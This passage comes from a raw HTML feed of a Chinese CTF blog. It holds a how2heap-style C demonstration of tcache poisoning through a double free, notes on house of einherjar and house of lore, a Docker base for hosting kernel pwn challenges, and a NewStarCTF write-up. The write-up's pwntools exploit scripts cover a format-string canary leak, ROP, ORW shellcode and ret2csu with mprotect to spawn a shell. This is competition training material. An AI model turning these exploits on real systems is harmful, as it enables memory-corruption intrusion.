class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This attack should bypass the restriction introduced in</span><br><span class="hljs-comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span><br><span class="hljs-comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span><br><span class="hljs-comment">     * simple tcache poisoning</span><br><span class="hljs-comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span><br><br>    <span class="hljs-comment">// disable buffering so _IO_FILE does not interfere with our heap</span><br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// introduction</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This attack only relies on double free.\n&quot;</span>);<br><br>    <span class="hljs-comment">// prepare the target</span><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The address we want malloc() to return, namely,&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);<br><br>    <span class="hljs-comment">// prepare heap layout</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Preparing heap layout&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a chunk for later consolidation&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating the victim chunk.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-comment">// cause chunk overlapping</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);<br>    <span class="hljs-built_in">free</span>(prev);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// a is already freed</span><br>    <span class="hljs-comment">/*VULNERABILITY*/</span><br>    <br>    <span class="hljs-comment">// simple tcache poisoning</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Launch tcache poisoning&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);<br>    b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;<br>    <br>    <span class="hljs-comment">// take target out</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we can cash out the target chunk.&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The new chunk is at %p\n&quot;</span>, c);<br>    <br>    <span class="hljs-comment">// sanity check</span><br>    assert(c==stack_var);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got control on target/stack!\n\n&quot;</span>);<br>    <br>    <span class="hljs-comment">// note</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note:&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先我们用7个chunk填满tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// cause chunk overlapping</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>    <span class="hljs-built_in">free</span>(x[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>之后free掉同样大小的prev chunk和a chunk，这时他们会在unsorted bin内合并为一个大chunk</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">puts<span class="hljs-comment">(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;)</span>;<br>free<span class="hljs-comment">(a)</span>;<br><br>puts<span class="hljs-comment">(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;)</span>;<br>free<span class="hljs-comment">(prev)</span>;<br></code></pre></td></tr></table></figure><p>先申请一个chunk，然后利用uaf，对 a chunk再次free，让其进入tcache。此时，a chunk同时在tcache和unsorted bin 中。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">puts<span class="hljs-comment">(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;)</span>;<br>malloc<span class="hljs-comment">(0x100)</span>;<br><span class="hljs-comment">/*VULNERABILITY*/</span><br>free<span class="hljs-comment">(a)</span>;<span class="hljs-comment">// a is already freed</span><br><span class="hljs-comment">/*VULNERABILITY*/</span><br></code></pre></td></tr></table></figure><p>此时如果我们申请一个大一点的chunk，比如0x120，那么就会把prev的指针返回回来，并且可以对a chunk进行溢出，进而更改a chunk的fd，bk等等。</p><h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><p>house of einherjar是一种特殊的堆利用手段，在存在堆溢出可以更改下一个chunk的PREV_INUSE位时，可以利用free的堆块合并，使用这种方式实现任意地址的控制。</p><p><img src="/img/article/how2heap1/backward_consolidate-1666247169487-3.png" alt="示意图"></p><h3 id="溢出前状态"><a href="#溢出前状态" class="headerlink" title="溢出前状态"></a>溢出前状态</h3><p>假设溢出前状态如下</p><p><img src="/img/article/how2heap1/einherjar_before_overflow.png" alt="img"></p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>这里我们假设 p0 堆块一方面可以写 prev_size 字段，另一方面，存在 off by one 的漏洞，可以写下一个 chunk 的 PREV_INUSE 部分，那么</p><p><img src="/img/article/how2heap1/einherjar_overflowing.png" alt="img"></p><h3 id="溢出后"><a href="#溢出后" class="headerlink" title="溢出后"></a>溢出后</h3><p><strong>假设我们将 p1 的 prev_size 字段设置为我们想要的目的 chunk 位置与 p1 的差值</strong>。在溢出后，我们释放 p1，则我们所得到的新的 chunk 的位置 <code>chunk_at_offset(p1, -((long) prevsize))</code> 就是我们想要的 chunk 位置了。</p><p>当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了 fake chunk 以便于绕过 unlink 的检测。</p><p><img src="/img/article/how2heap1/einherjar_after_overflow-1666251341548-11.png" alt="img"></p><p>在这种情况下，我们便可将fake chunk通过再次malloc获得</p><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p><p>实际过程就是控制smallbin的最后一个chunk的bk指针，以及fakechunk的fd指针完成双链表的构建既可两次malloc控制任意地址</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Kernel-pwnbase详解</title>
    <link href="/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/"/>
    <url>/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>参加starnewctf week4后，想要复现一道kernel的题。网上基本找不到Kernel-pwn的base，因此做了这个pwnbase用于在ctfd上提供动态kernel题目。<br>base下载地址<a href="https://github.com/Loora1N/pwnbase/tree/main/kernelbase">kernelbase</a></p></blockquote><h2 id="Dockfile"><a href="#Dockfile" class="headerlink" title="Dockfile"></a>Dockfile</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive apt-get install -y lib32z1 xinetd git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev qemu qemu-system-x86</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m ctf</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./files/ /home/ctf/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> -R 750 /home/ctf</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>docker基础是ubuntu20.04，整个dockerfile主要是下载一些关键库，以及对目录权限的管理，最后会调用<code>start.sh</code>, 并且开放9999端口</p><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># Add your startup script</span><br><br><span class="hljs-comment"># DO NOT DELETE</span><br>/etc/init.d/xinetd start;<br><span class="hljs-built_in">sleep</span> infinity;<br></code></pre></td></tr></table></figure><p>东西很短，其实就是调用<code>ctf.xinetd</code></p><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf.xinetd"></a>ctf.xinetd</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">service ctf<br>&#123;<br>    disable = no<br>    socket_type = stream<br>    protocol    = tcp<br>    wait        = no<br>    user        = root<br>    type        = UNLISTED<br>    port        = <span class="hljs-number">9999</span><br>    bind        = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br>    server      = <span class="hljs-regexp">/usr/</span>sbin/chroot<br>    <span class="hljs-comment"># replace helloworld to your program</span><br>    server_args = --userspec=<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span> <span class="hljs-regexp">/ ./</span>home<span class="hljs-regexp">/ctf/</span>helloworld<br>    banner_fail = <span class="hljs-regexp">/etc/</span>banner_fail<br>    <span class="hljs-comment"># safety options</span><br>    per_source= <span class="hljs-number">10</span> <span class="hljs-comment"># the maximum instances of this service per source IP address</span><br>    rlimit_cpu= <span class="hljs-number">20</span> <span class="hljs-comment"># the maximum number of CPU seconds that the service may use</span><br>    <span class="hljs-comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span><br>    <span class="hljs-comment">#access_times = 2:00-9:00 12:00-24:00</span><br>&#125;<br></code></pre></td></tr></table></figure><p>核心在13行的后半，nc连接后会调用helloworld程序</p><h2 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    init();   <br>    signal(SIGCHLD, SIG_DFL);<br>    system(<span class="hljs-string">&quot;/home/ctf/boot.sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序与普通的pwn题目类似，先初始化输入输出，随后调用boot.sh启动qemu即可。signal函数是为了防止system函数可能出现的错误。</p><h2 id="boot-sh"><a href="#boot-sh" class="headerlink" title="boot.sh"></a>boot.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64  \<br>-m 128M \<br>-kernel /home/ctf/bzImage \<br>-initrd /home/ctf/rootfs.cpio \<br>-monitor /dev/null \<br>-cpu kvm64,+smep,+smap \<br>-append <span class="hljs-string">&quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr noapic&quot;</span> \<br>-nographic \<br>-no-reboot <br><br></code></pre></td></tr></table></figure><p>关键在于 kernel和initrd一定要使用绝对路径，即便它们与<code>helloworld</code>在一个目录下，system调用时依然可能会出现找不到文件的情况出现，建议在 <code>-append</code>里加入 <code>noapic</code> 可以防止出现AIPC错误。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF Week4 PWN WP</title>
    <link href="/2022/10/17/NewStarCTF%20Week4%20PWN%20WP/"/>
    <url>/2022/10/17/NewStarCTF%20Week4%20PWN%20WP/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>由于知道这个比赛比较晚，正式参与比赛是第四周的周三晚上，还差一道堆🐎，没有完成AK(但是拿了四个一血也好爽)。最后一题未解主要原因确实是自己在_IO_File相关利用了解不足，赛后找夜悠师傅拿到了exp，真的好感谢🌹</p></blockquote><p><img src="/img/article/newstarctf/image-20221017112826465.png" alt="战绩截图"></p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>比较简单的一道题，等我开始做题的时候已经有4个解了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,26078)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># pause()</span><br>io.recvuntil(<span class="hljs-string">&#x27;Now answer me, will you v me 50&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;%11$p%9$p&#x27;</span>)<br>io.recvline()<br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br>code_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x840</span> <br>success(<span class="hljs-string">&quot;canary --&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br>success(<span class="hljs-string">&quot;code_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(code_base))<br><br>money = code_base + <span class="hljs-number">0x20206c</span><br>payload =  <span class="hljs-string">b&#x27;%99c%7$n&#x27;</span> + p64(money)<br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;What do you want to say to the canary&#x27;</span>)<br>io.sendline(payload)<br>io.recvline()<br>binsh = code_base + <span class="hljs-number">0x202020</span><br>pop_rdi = code_base+<span class="hljs-number">0x0000000000000b33</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>syscall = code_base + <span class="hljs-number">0x9dc</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(syscall)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="OhMyShellcode"><a href="#OhMyShellcode" class="headerlink" title="OhMyShellcode"></a>OhMyShellcode</h2><p>一道orw的shellcode题目，题目专门开了一个空间用于放置orw，也比较简单。关键在于第一次读入有个判断，会拦住<code>\x0f</code>，但是检测长度并不完全。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25430</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>backdoor = <span class="hljs-number">0x233000</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;Show me your magic.&#x27;</span>)<br>read = <span class="hljs-string">&#x27;&#x27;&#x27;mov rsi,0x23301e</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">mov rax , 0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>sh = asm(read)<br>sh2 =asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>sh2+=asm(shellcraft.read(<span class="hljs-number">3</span>,backdoor+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>sh2+=asm(shellcraft.write(<span class="hljs-number">1</span>,backdoor+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><br>io.send(sh)<br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;Good luck!&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(backdoor)<br>io.sendline(payload)<br>raw_input()<br>io.sendline(sh2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2csu2"><a href="#ret2csu2" class="headerlink" title="ret2csu2"></a>ret2csu2</h2><p>做这道题的时候并没有去看第三周的ret2csu，夜悠师傅的评价是这样的，不得不说这个题的gadget还是很漂亮的。</p><p><img src="/img/article/newstarctf/image-20221017121338219.png" alt="会玩就行"></p><p>第一次payload要改rbp到bss段，同时跳转回<code>sys_read</code>，实现对bss写入<code>ret2csu</code>的rop调用<code>mprotect</code>，以及shellcode布置。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29895</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>csu_end_addr = <span class="hljs-number">0x40075a</span><br>csu_front_addr = <span class="hljs-number">0x400740</span><br><br>mprotect = <span class="hljs-number">0x40067b</span><br>mprotect_plt = <span class="hljs-number">0x600fe8</span><br>bss = <span class="hljs-number">0x601110</span><br>bss1 = <span class="hljs-number">0x601020</span><br>leave_ret =<span class="hljs-number">0x400681</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sc = asm(shellcraft.sh())<br>    payload +=sc<br>    payload += <span class="hljs-string">b&#x27;b&#x27;</span> *<span class="hljs-number">0x40</span><br>    payload += p64(bss1-<span class="hljs-number">0x8</span>)<br>    payload += p64(leave_ret)<br>    io.send(payload)<br>    <span class="hljs-comment"># sleep(1)</span><br>pause()<br>io.recvuntil(<span class="hljs-string">&#x27;check it!&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(bss)+p64(<span class="hljs-number">0x4006e7</span>)<br>io.send(payload)<br>sleep(<span class="hljs-number">1</span>)<br><br>csu(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,mprotect_plt,<span class="hljs-number">0x601000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x6010a0</span>)<br><br>io.interactive()ma<br></code></pre></td></tr></table></figure><h2 id="这是堆🐴"><a 